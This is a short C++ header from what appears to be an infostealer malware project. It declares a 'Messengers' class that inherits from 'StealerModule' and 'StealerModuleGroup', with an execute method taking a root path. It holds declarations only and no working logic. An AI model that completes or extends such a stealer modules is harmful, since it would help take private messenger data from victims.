//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_MESSENGERS_H
#define STEALER_MESSENGERS_H

#include "../../StealerModule.h"
#include "../../StealerModuleGroup.h"

class Messengers : public StealerModule, StealerModuleGroup {
public:
    Messengers();
    void execute(fs::path& root) override;
};

#endif //STEALER_MESSENGERS_H
